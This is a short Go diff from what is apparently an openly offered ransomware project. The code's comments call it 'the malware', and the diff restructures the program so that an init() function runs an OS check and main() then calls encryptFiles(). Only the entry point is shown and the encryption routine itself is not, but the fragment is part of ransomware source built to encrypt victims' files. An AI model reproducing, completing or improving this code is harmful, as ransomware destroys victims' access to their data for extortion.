@@ -35,7 +35,7 @@ var (
 	FilesToRename []cmd.File
 )
 
-func main() {
+func init() {
 	// If you compile this program without -ldflags "-H windowsgui"
 	// you can see a console window with all actions performed by
 	// the malware. Otherwise, the prints above and all logs will be
@@ -46,7 +46,9 @@ func main() {
 
 	// Execution locked for windows
 	cmd.CheckOS()
+}
 
+func main() {
 	// Hannibal ad portas
 	encryptFiles()
 
